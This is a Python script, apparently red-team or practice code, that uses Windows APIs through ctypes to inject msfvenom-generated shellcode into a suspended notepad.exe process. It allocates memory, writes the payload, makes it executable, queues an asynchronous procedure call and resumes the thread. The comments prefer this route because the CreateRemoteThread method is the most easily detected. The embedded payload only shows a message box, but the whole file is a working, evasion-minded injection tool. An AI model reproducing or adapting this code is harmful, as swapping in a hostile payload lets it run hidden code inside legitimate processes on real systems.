from asyncio import Handle
from ctypes import *
from ctypes import wintypes
import subprocess

kernel32 = windll.kernel32

SIZE_T = c_size_t
LPSTR = POINTER(c_char)
LPBYTE = POINTER(c_ubyte)

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [("nLength", wintypes.DWORD),
                ("lpSecurityDescriptor", wintypes.LPVOID),
                ("bInheritHandle", wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

VirtualProtectEx = kernel32.VirtualProtectEx
VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
VirtualProtectEx.restype = wintypes.BOOL

#process = subprocess.Popen(["notepad.exe"])
#print("Process ID: ", process.pid)

# Alternative using CreateProcessA using win32api

class STARTUPINFO(Structure):
    _fields_ = [("cb", wintypes.DWORD),
                ("lpReserved", wintypes.LPSTR),
                ("lpDesktop", wintypes.LPSTR),
                ("lpTitle", wintypes.LPSTR),
                ("dwX", wintypes.DWORD),
                ("dwY", wintypes.DWORD),
                ("dwXSize", wintypes.DWORD),
                ("dwYSize", wintypes.DWORD),
                ("dwXCountChars", wintypes.DWORD),
                ("dwYCountChars", wintypes.DWORD),
                ("dwFillAttribute", wintypes.DWORD),
                ("dwFlags", wintypes.DWORD),
                ("wShowWindow", wintypes.WORD),
                ("cbReserved2", wintypes.WORD),
                ("lpReserved2", wintypes.LPBYTE),
                ("hStdInput", wintypes.HANDLE),
                ("hStdOutput", wintypes.HANDLE),
                ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(Structure):
    _fields_ = [("hProcess", wintypes.HANDLE),
                ("hThread", wintypes.HANDLE),
                ("dwProcessId", wintypes.DWORD),
                ("dwThreadId", wintypes.DWORD)]

CreateProcessA = kernel32.CreateProcessA
CreateProcessA.argtypes = (wintypes.LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCSTR, POINTER(STARTUPINFO), POINTER(PROCESS_INFORMATION))
CreateProcessA.restype = wintypes.BOOL

# Shell code to inject and execute
# Shellcode generated via msfvenom 
# msfvenom -a x64 -p windows/x64/messagebox TITLE=Hello World! TEXT=Hello World! -f python 

buf =  b""
buf += b"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00"
buf += b"\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"
buf += b"\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20"
buf += b"\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
buf += b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1"
buf += b"\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b"
buf += b"\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
buf += b"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00"
buf += b"\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
buf += b"\x40\x20\x8b\x48\x18\x50\x49\x01\xd0\xe3\x56\x48"
buf += b"\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6"
buf += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38"
buf += b"\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75"
buf += b"\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
buf += b"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
buf += b"\x88\x41\x58\x48\x01\xd0\x41\x58\x5e\x59\x5a\x41"
buf += b"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff"
buf += b"\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff"
buf += b"\xff\x5d\xe8\x0b\x00\x00\x00\x75\x73\x65\x72\x33"
buf += b"\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c\x77\x26"
buf += b"\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x06"
buf += b"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x00\x5a\xe8\x06"
buf += b"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x00\x41\x58\x48"
buf += b"\x31\xc9\x41\xba\x45\x83\x56\x07\xff\xd5\x48\x31"
buf += b"\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5"

def verify(x):
    if not x:
        raise WinError()

# Create the process into which we will inject the shellcode
startup_info = STARTUPINFO()
startup_info.cb = sizeof(STARTUPINFO)

startup_info.dwFlags = 1 # STARTF_USESHOWWINDOW
startup_info.wShowWindow = 1 # SW_SHOWNORMAL

process_info = PROCESS_INFORMATION()

CREATE_NEW_CONSOLE = 0x00000010
CREATE_NO_WINDOW = 0x08000000
CREATE_SUSPENDED = 0x00000004

created = CreateProcessA(b"C:\\Windows\\System32\\notepad.exe", None, None, None, False, CREATE_SUSPENDED | CREATE_NO_WINDOW, None, None, byref(startup_info), byref(process_info))

verify(created)

pid = process_info.dwProcessId
h_process = process_info.hProcess
threadID = process_info.dwThreadId
h_thread = process_info.hThread

print("Started Process => Handle: %s, PID: %s, ThreadID: %s" % (h_process, pid, threadID))

# Allocate memory in the target process
remote_memory = VirtualAllocEx(h_process, False, len(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
verify(remote_memory)

print("Allocated Memory => Handle: %s, Address: %s" % (h_process, hex(remote_memory)))

# Write the shellcode into the allocated memory
written = WriteProcessMemory(h_process, remote_memory, buf, len(buf), None)
verify(written)

print("Bytes Written => %s" % len(buf))

# Currently the memory is only read and write accessible
# We need to make it executable

PAGE_EXECUTE_READWRITE = 0x20

old_protection = wintypes.DWORD()

protect = VirtualProtectEx(h_process, remote_memory, len(buf), PAGE_EXECUTE_READWRITE, byref(old_protection))
verify(protect)

print("Memory Protection updated from %s to %s" % (hex(old_protection.value), hex(PAGE_EXECUTE_READWRITE)))

# Perform the actual injection -- Most common approach and therefore most easily identified
#rthread = CreateRemoteThread(h_process, None, 0, remote_memory, None, EXECUTE_IMMEDIATELY, None)
#verify(rthread)

PAPCFUNC = CFUNCTYPE(None, POINTER(wintypes.ULONG))

# Alternate way to create remote thread using queueUserAPC - asynchronous procedure call
QueueUserAPC = kernel32.QueueUserAPC
QueueUserAPC.argtypes = (PAPCFUNC, wintypes.HANDLE, POINTER(wintypes.ULONG))
QueueUserAPC.restype = wintypes.BOOL

# To continue the suspended process
ResumeThread = kernel32.ResumeThread
ResumeThread.argtypes = (wintypes.HANDLE,)
ResumeThread.restype = wintypes.BOOL

rqueue = QueueUserAPC(PAPCFUNC(remote_memory), h_thread, None)
verify(rqueue)
print("Queueing APC thread => {}".format(h_thread))

# resume the suspended process

rthread = ResumeThread(h_thread)
verify(rthread)
print("Resuming Thread => {}".format(h_thread))